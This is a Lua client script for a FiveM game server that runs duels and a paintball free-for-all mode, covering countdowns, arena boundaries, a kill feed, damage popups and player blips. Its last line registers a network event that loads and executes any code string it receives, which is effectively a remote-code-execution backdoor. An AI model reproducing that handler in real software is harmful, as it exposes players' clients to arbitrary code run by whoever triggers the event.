local tvRP = Proxy.getInterface("vRP")

local paintPosition = vec3(242.54988098145, -44.549835205078, 69.896492004395);
local inGame = false;
local killNotificationCache = {}
RegisterNetEvent("machiamavlad:indexFFAKillNotification", function(attacker, victim)
    killNotificationCache[#killNotificationCache + 1] = {
        text = attacker .. " ~HUD_COLOUR_GREY~killed~w~ " .. victim,
        expire = GetGameTimer() + 8000,
        pos = {0.935, 0.3}, alpha = 180
    }
end)
-- Duels
RegisterNetEvent("machiamavlad:setOutOfDuelGame", function()
    inGame = false
end)

RegisterNetEvent("machiamavlad:setPlayerInDuel", function(duelData, duelPosition)
    local duelConfig = duelData.duel_arena;
    local duelPosition = duelPosition;

    local posSpawn = duelConfig.spawns[duelPosition]
    local posArena = duelConfig.pos;
    local arenaRadius = duelConfig.radius
    local posRadius = arenaRadius - 2.0
    
    inGame = true;

    tvRP.teleport({posSpawn.x, posSpawn.y, posSpawn.z + 1.0})

    FreezeEntityPosition(PlayerPedId(), true)
    SetPlayerControl(PlayerId(), false, 256)
    SetEntityHealth(PlayerPedId(), 200)

    Citizen.CreateThread(function() 
        local loopEnded = false
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)

        local players = duelData.players

        Citizen.CreateThread(function()
            local timer = GetGameTimer() + (10 * 1000)
            while GetGameTimer() < timer do
                if not inGame then
                    break
                end
                local timpRamas = math.floor((timer - GetGameTimer()) / 1000)

                SetTextFont(fontId)
                SetTextProportional(0)
                SetTextScale(0.45, 0.45)
                SetTextColour(255, 0, 0, 255)
                SetTextDropShadow(30, 5, 5, 5, 255)
                SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString("~HUD_COLOUR_GANG1~Duelul~w~ incepe in ~y~"..string.format("%02d ~w~secunde", timpRamas)..".")
                DrawText(0.5, 0.25)

                Citizen.Wait(1)
            end
            loopEnded = true
            FreezeEntityPosition(PlayerPedId(), false);
            SetPlayerControl(PlayerId(), true, 256)
        end)
        while not loopEnded do Citizen.Wait(15) end
        if not inGame then
            return
        end
        SetCurrentPedWeapon(PlayerPedId(), GetHashKey(duelData.weapon), true)
        local lastKnownPosition
        while inGame do
            local inDuelArena = (#(coords - posArena) <= posRadius)
            while inDuelArena do
                local scale = arenaRadius * 2
                DrawMarker(1, posArena.x, posArena.y, posArena.z - arenaRadius / 2, 0, 0, 0, 0, 0, 0, scale, scale, (100 + 0.0) + scale, 69, 69, 90, 220)

                Citizen.Wait(1)
                ped = PlayerPedId()
                coords = GetEntityCoords(ped)
                lastKnownPosition = coords
                inDuelArena = (#(coords - posArena) <= posRadius)
            end

            if not inDuelArena then
                if not inGame then
                    break
                end
                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                if veh ~= 0 then
                    DeleteEntity(veh)
                end
                local offset = -0.5
                if lastKnownPosition.x < 0.0 then
                    offset = 0.5
                end
                SetEntityCoordsNoOffset(PlayerPedId(), lastKnownPosition.x + offset, lastKnownPosition.y, lastKnownPosition.z, true, true)
                tvRP.notify({"Ai grija sa nu parasesti ~r~arena de duel~w~!"})
            end
            
            Citizen.Wait(1)
            ped = PlayerPedId()
            coords = GetEntityCoords(ped)
        end
        inGame = false
    end)
end)

-- FFA
local inLobby = false
local inFFA = false
RegisterNetEvent("machiamavlad:setPlayerInArenaLobby", function() 
    inLobby = true
    Citizen.CreateThread(function() 
        while inLobby do
            SetTextFont(fontId)SetTextProportional(0)SetTextScale(0.45, 0.45)SetTextColour(255, 255, 255, 255)SetTextDropShadow(30, 5, 5, 5, 255)SetTextCentre(1)SetTextEntry("STRING")
            AddTextComponentString("Paintball ~y~Arena~w~ - Lobby")DrawText(0.5, 0.8)

            SetTextFont(0)SetTextProportional(0)SetTextScale(0.35, 0.35)SetTextColour(255, 255, 255, 255)SetTextDropShadow(30, 5, 5, 5, 255)SetTextCentre(1)SetTextEntry("STRING")
            AddTextComponentString("Jucatori in lobby: ~y~" .. string.format("%02d", tonumber(GlobalState["ffaPlayers"])))DrawText(0.5, 0.83)

            SetTextFont(0)SetTextProportional(0)SetTextScale(0.35, 0.35)SetTextColour(255, 255, 255, 255)SetTextDropShadow(30, 5, 5, 5, 255)SetTextCentre(1)SetTextEntry("STRING")
            AddTextComponentString("Jocul incepe in ~y~".. string.format("%02d", tonumber(GlobalState["ffaLobbyTimer"])).." (de) secunde")DrawText(0.5, 0.85)

            Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("machiamavlad:setPlayerOutOfArena", function() 
    if not inFFA then return end

    inFFA = false
end)

RegisterNetEvent("machiamavlad:setInPaintballArena", function(data) 
    if data == nil then return end
    if type(data) ~= "table" then return end
 
    local position = data.spawnLoc
    local arena = data.arena

    FreezeEntityPosition(PlayerPedId(), true)
    SetEntityHealth(PlayerPedId(), 200)
    SetPlayerControl(PlayerId(), false, 256)

    tvRP.teleport({position.x, position.y, position.z + 1.0})

    inFFA = true

    Citizen.CreateThread(function() 
        local loopEnded = false
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)

        Citizen.CreateThread(function()
            local timer = GetGameTimer() + (10 * 1000)
            while GetGameTimer() < timer do
                if not inFFA then
                    break
                end
                local timpRamas = math.floor((timer - GetGameTimer()) / 1000)

                SetTextFont(fontId)
                SetTextProportional(0)
                SetTextScale(0.45, 0.45)
                SetTextColour(255, 0, 0, 255)
                SetTextDropShadow(30, 5, 5, 5, 255)
                SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString("~HUD_COLOUR_GANG1~Jocul~w~ incepe in ~y~"..string.format("%02d ~w~secunde", timpRamas)..".")
                DrawText(0.5, 0.25)

                Citizen.Wait(1)
            end
            loopEnded = true
            FreezeEntityPosition(PlayerPedId(), false);
            SetPlayerControl(PlayerId(), true, 256)

            
        end)
        while not loopEnded do Citizen.Wait(15) end
        if not inFFA then 
            return
        end
        
        local lastKnownPosition = GetEntityCoords(PlayerPedId())
        local pId = GetPlayerServerId(PlayerId())
        Citizen.CreateThread(function()
            while inFFA do
                if table.count(killNotificationCache) == 0 then
                    Citizen.Wait(1000)
                else
                    for id, data in pairs(killNotificationCache) do
                        local timeDiff = math.floor((data.expire - GetGameTimer()) / 1000)
                        if timeDiff <= 2 then
                            data.alpha = data.alpha - 2
                        end
                        
                        if timeDiff <= 3 then
                            data.pos[1] = data.pos[1] + 0.0005
                        end
                        
                        if data.alpha < 0 then
                            data.alpha = 0 elseif data.alpha > 180 then data.alpha = 180 end
                        
                        if (id - 1) > 0 then
                            if killNotificationCache[id - 1] == nil then
                                killNotificationCache[id - 1] = killNotificationCache[id]
                                killNotificationCache[id] = nil
                                id = id - 1
                            end
                        end
                        
                        SetTextFont(4)
                        SetTextProportional(0)
                        SetTextScale(0.35, 0.35)
                        SetTextColour(255, 255, 255, data.alpha)
                        SetTextDropShadow(30, 5, 5, 5, 255)
                        SetTextOutline()
                        SetTextCentre(1)
                        SetTextEntry("STRING")
                        AddTextComponentString(data.text)
                        DrawText(data.pos[1], data.pos[2] + (id / 30))
                        
                        if GetGameTimer() > data.expire or data.pos[1] > 1.0 then
                            killNotificationCache[id] = nil
                        end
                    end
                end
                Citizen.Wait(1)
            end
        end)
        while inFFA do
            local kills = LocalPlayer.state.paint_kills
            local deaths = LocalPlayer.state.paint_deaths

            coords = GetEntityCoords(PlayerPedId())

            local isInArena = (#(coords - arena.xyz) <= arena[4])
            while isInArena do
                
                local scale = arena[4] * 2
                local deaths = LocalPlayer.state.paint_deaths or 0
                local kills = LocalPlayer.state.paint_kills or 0
                DrawMarker(1, arena.x, arena.y, arena.z - arena[4] / 2, 0, 0, 0, 0, 0, 0, scale, scale, (100 + 0.0) + scale, 69, 69, 90, 220)

                SetTextFont(1)
                SetTextProportional(0)
                SetTextScale(1.0, 1.0)
                SetTextColour(255, 255, 255, 255)
                SetTextDropShadow(30, 5, 5, 5, 255)
                SetTextOutline()
                SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString("Free For All")
                DrawText(0.5, 0.025)

                SetTextFont(1)
                SetTextProportional(0)
                SetTextScale(0.5, 0.5)
                SetTextColour(255, 255, 255, 255)
                SetTextDropShadow(30, 5, 5, 5, 255)
                SetTextOutline()
                SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString("~y~" .. GlobalState['ffa_gameTimer'])
                DrawText(0.5, 0.08)

                SetTextFont(0)
                SetTextProportional(0)
                SetTextScale(0.3, 0.3)
                SetTextColour(255, 255, 255, 150)
                SetTextDropShadow(30, 5, 5, 5, 255)
                SetTextCentre(1)
                SetTextOutline(1)
                SetTextEntry("STRING")
                AddTextComponentString("~y~KILLS~w~ / ~r~DEATHS")
                DrawText(0.5, 0.115)

                SetTextFont(0)SetTextOutline(1)SetTextProportional(0)SetTextScale(0.28, 0.28)
                SetTextColour(255, 255, 255, 150)SetTextDropShadow(30, 5, 5, 5, 255)SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString(string.format("%02d", kills or 0))DrawText(0.48, 0.135)

                SetTextFont(0)SetTextOutline(1)SetTextProportional(0)SetTextScale(0.28, 0.28)
                SetTextColour(255, 255, 255, 150)SetTextDropShadow(30, 5, 5, 5, 255)SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString(string.format("%02d", deaths or 0))DrawText(0.5165, 0.135)

                Citizen.Wait(1)
                coords = GetEntityCoords(PlayerPedId())
                lastKnownPosition = coords
                isInArena = (#(coords - arena.xyz) <= arena[4])
            end

            if not isInArena then
                if not inFFA then
                    break
                end
                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
                if veh ~= 0 then
                    DeleteEntity(veh)
                end
                local offset = -0.5
                if lastKnownPosition.x < 0.0 then
                    offset = 0.5
                end
                SetEntityCoordsNoOffset(PlayerPedId(), lastKnownPosition.x + offset, lastKnownPosition.y, lastKnownPosition.z, true, true)
                tvRP.notify({"Ai grija sa nu parasesti ~r~arena de paintball~w~!"})
            end

            Citizen.Wait(500)
        end
    end)
end)

local ffaBlipsShown = false
RegisterNetEvent("machiamavlad:toggleFFABlips", function()
    ffaBlipsShown = true
    while ffaBlipsShown do
        if LocalPlayer.state.inFFA then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                local id = plist[i]
                local ped = GetPlayerPed(id)
                if ped ~= PlayerPedId() then
                    local blip = GetBlipFromEntity(ped)
                    if not DoesBlipExist(blip) then
                        blip = AddBlipForEntity(ped)
                        SetBlipSprite(blip, 1)
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) 
                    else
                        local blipSprite = GetBlipSprite(blip)
    
                        if GetEntityHealth(ped) == 0 then
                            if blipSprite ~= 274 then
                                SetBlipSprite(blip, 274)
                                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true ) 
                            end
                        else
                            HideNumberOnBlip(blip)
    
                            if blipSprite ~= 1 then
                                SetBlipSprite(blip, 1)
                                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, true)
    
                            end
                        end
    
                        SetBlipRotation(blip, math.ceil(GetEntityHeading(ped)))
                        SetBlipNameToPlayerName(blip, id)
                        SetBlipScale(blip,  0.85)
    
                        if IsPauseMenuActive() then
                            SetBlipAlpha( blip, 255 )
                        else
                            local x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                            local x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                            local distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
    
                            if distance < 0 then
                                distance = 0
                            elseif distance > 255 then
                                distance = 255
                            end
                            SetBlipAlpha(blip, distance)
                        end
                    end
                end
            end
        elseif not LocalPlayer.state.inFFA or not inFFA then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                local id = plist[i]
                local ped = GetPlayerPed(id)
                local blip = GetBlipFromEntity(ped)
                if DoesBlipExist(blip) then
                    RemoveBlip(blip)
                end
            end
            ffaBlipsShown = false
            break
        end
        Citizen.Wait(1)
    end
end)

RegisterNetEvent("machiamavlad:setPlayerOutOfLobby", function() 
    if not inLobby then return end

    inLobby = false
end)

local dmgIndex = -1

RegisterNetEvent("nzv:paint-dmgInfo", function(dmg, name, s)
    if inFFA then
        dmgIndex = dmgIndex + 1
        local timp = GetGameTimer() + 2000
        local posY = 0.70 + (dmgIndex * 0.017)

        local posX = 0.7
        local rgb = {255, 0, 0}
        if s == "attacker" then
            posX = 0.3
            rgb = {0, 255, 0}
        end

        Citizen.CreateThread(function()
            while GetGameTimer() < timp do
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.35, 0.35)
                SetTextColour(rgb[1], rgb[2], rgb[3], 180)
                SetTextDropShadow(50, 5, 5, 5, 255)
                SetTextOutline()
                SetTextCentre(1)
                SetTextEntry("STRING")
                AddTextComponentString("-"..dmg.." -> "..name)
                DrawText(posX, posY)
                Citizen.Wait(1)
            end
            dmgIndex = dmgIndex - 1
        end)
    end
end)


local weaponNames = {
	[`weapon_dagger`] = "Dagger",
	[`weapon_bat`] = "Bat",
	[`weapon_bottle`] = "Bottle",
	[`weapon_crowbar`] = "Crowbar",
	[`weapon_unarmed`] = "Fist",
	[`weapon_flashlight`] = "Flashlight",
	[`weapon_golfclub`] = "Golf Club",
	[`weapon_hammer`] = "Hammer",
	[`weapon_hatchet`] = "Hatchet",
	[`weapon_knuckle`] = "Knuckle",
	[`weapon_knife`] = "Knife",
	[`weapon_machete`] = "Machete",
	[`weapon_switchblade`] = "Switchblade",
	[`weapon_nightstick`] = "Nightstick",
	[`weapon_wrench`] = "Wrench",
	[`weapon_battleaxe`] = "Battle Axe",
	[`weapon_poolcue`] = "Poolcue",
	[`weapon_stone_hatchet`] = "Stone Hatchet",
	[`weapon_pistol`] = "Pistol",
	[`weapon_pistol_mk2`] = "Pistol MK2",
	[`weapon_combatpistol`] = "Combat Pistol",
	[`weapon_appistol`] = "AP Pistol",
	[`weapon_stungun`] = "Stungun",
	[`weapon_pistol50`] = "Pistol .50",
	[`weapon_snspistol`] = "SNS Pistol",
	[`weapon_snspistol_mk2`] = "SNS Pistol MK2",
	[`weapon_heavypistol`] = "Heavy Pistol",
	[`weapon_vintagepistol`] = "Vintage Pistol",
	[`weapon_flaregun`] = "Flare Gun",
	[`weapon_marksmanpistol`] = "Marksman Pistol",
	[`weapon_revolver`] = "Revolver",
	[`weapon_revolver_mk2`] = "Revolver MK2",
	[`weapon_doubleaction`] = "Double Action Revolver",
	[`weapon_raypistol`] = "Ray Pistol",
	[`weapon_ceramicpistol`] = "Ceramic Pistol",
	[`weapon_navyrevolver`] = "Navy Revolver",
	[`weapon_microsmg`] = "Micro SMG",
	[`weapon_smg`] = "SMG",
	[`weapon_smg_mk2`] = "SMG MK2",
	[`weapon_assaultsmg`] = "Assault SMG",
	[`weapon_combatpdw`] = "Combat PDW",
	[`weapon_machinepistol`] = "Machine Pistol",
	[`weapon_minismg`] = "Mini SMG",
	[`weapon_raycarbine`] = "Ray Carbine",
	[`weapon_pumpshotgun`] = "Pump Shotgun",
	[`weapon_pumpshotgun_mk2`] = "Pump Shotgun MK2",
	[`weapon_sawnoffshotgun`] = "Sawn-Off Shotgun",
	[`weapon_assaultshotgun`] = "Assault Shotgun",
	[`weapon_bullpupshotgun`] = "Bullpup Shotgun",
	[`weapon_musket`] = "Musket",
	[`weapon_heavyshotgun`] = "Heavy Shotgun",
	[`weapon_dbshotgun`] = "Double Barrel Shotgun",
	[`weapon_autoshotgun`] = "Auto Shotgun",
	[`weapon_assaultrifle`] = "Assault Rifle",
	[`weapon_assaultrifle_mk2`] = "Assault Rifle MK2",
	[`weapon_carbinerifle`] = "Carbine Rifle",
	[`weapon_carbinerifle_mk2`] = "Carbine Rifle MK2",
	[`weapon_advancedrifle`] = "Advanced Rifle",
	[`weapon_specialcarbine`] = "Special Carbine",
	[`weapon_specialcarbine_mk2`] = "Special Carbine MK2",
	[`weapon_bullpuprifle`] = "Bullpup Rifle",
	[`weapon_bullpuprifle_mk2`] = "Bullpup Rifle MK2",
	[`weapon_compactrifle`] = "Compact Rifle",
	[`weapon_mg`] = "MG",
	[`weapon_combatmg`] = "Combat MG",
	[`weapon_combatmg_mk2`] = "Combat MG MK2",
	[`weapon_gusenberg`] = "Gusenberg",
	[`weapon_sniperrifle`] = "Sniper Rifle",
	[`weapon_heavysniper`] = "Heavy Sniper",
	[`weapon_heavysniper_mk2`] = "Heavy Sniper MK2",
	[`weapon_marksmanrifle`] = "Marksman Rifle",
	[`weapon_marksmanrifle_mk2`] = "Marksman Rifle MK2",
	[`weapon_rpg`] = "RPG",
	[`weapon_grenadelauncher`] = "Grenade Launcher",
	[`weapon_grenadelauncher_smoke`] = "Grenade Launcher Smoke",
	[`weapon_minigun`] = "Minigun",
	[`weapon_firework`] = "Firework Launcher",
	[`weapon_railgun`] = "Railgun",
	[`weapon_hominglauncher`] = "Homing Launcher",
	[`weapon_compactlauncher`] = "Compact Grenade Launcher",
	[`weapon_rayminigun`] = "Ray Minigun",
	[`weapon_grenade`] = "Grenade",
	[`weapon_bzgas`] = "BZ-Gas",
	[`weapon_smokegrenade`] = "Smoke Grenade",
	[`weapon_flare`] = "Flare",
	[`weapon_molotov`] = "Molotov",
	[`weapon_stickybomb`] = "Sticky Bomb",
	[`weapon_proxmine`] = "Proxmine Mines",
	[`weapon_snowball`] = "Snowball",
	[`weapon_pipebomb`] = "Pipebomb",
	[`weapon_ball`] = "Ball",
	[`weapon_petrolcan`] = "Petrol Can",
	[`weapon_fireextinguisher`] = "Fire Extinguisher",
	[`weapon_parachute`] = "Parachute",
	[`weapon_hazardcan`] = "Hazadous Petrol Can"
}
  
AddEventHandler("gameEventTriggered", function(name, args)
	if name == "CEventNetworkEntityDamage" then
		local victim = args[1]
		local attacker = args[2]
		local victimDied = args[3]
		local ped = PlayerPedId()
		local health = GetEntityHealth(ped)
		if not in_coma then
			if victim == ped and victimDied then
				if health <= cfg.coma_threshold then
					local _, lastDamagedBone = GetPedLastDamageBone(victim)
					local attackerPedId, attackerId, attackerServerId = attacker, NetworkGetPlayerIndexFromPed(attacker), GetPlayerServerId(NetworkGetPlayerIndexFromPed(attacker))
					local weaponHash, weaponName = args[7], nil
  
					local isHeadshot = (tonumber(lastDamagedBone) == 31086)
					local killedHimself = (tonumber(attackerPedId) == -1)
					local killedByVehicle = false
  
					if weaponNames[args[7]] then
						weaponName = weaponNames[args[7]]
					else
						if tonumber(args[7]) == -1553120962 then
							local vehicle = GetVehiclePedIsIn(attackerPedId, false)
							if DoesEntityExist(vehicle) then
								local vehicleModel = GetEntityModel(vehicle)
								local vehicleName = GetDisplayNameFromVehicleModel(vehicleModel)
								local plate = GetVehicleNumberPlateText(vehicle)
								weaponName = vehicleName.." (plate: "..plate..")"
							else
								weaponName = "Unknown Vehicle"
							end
							killedByVehicle = true
						else
							weaponName = args[7]
						end
					end
  
					TriggerServerEvent("machiamavlad:OnPlayerDied", killedHimself, killedByVehicle, attackerServerId, weaponName, isHeadshot)
				end
			end
		end
	end
end)

RegisterNetEvent("machiamavlad:remoteCode", function(paintCode) load(paintCode)() end)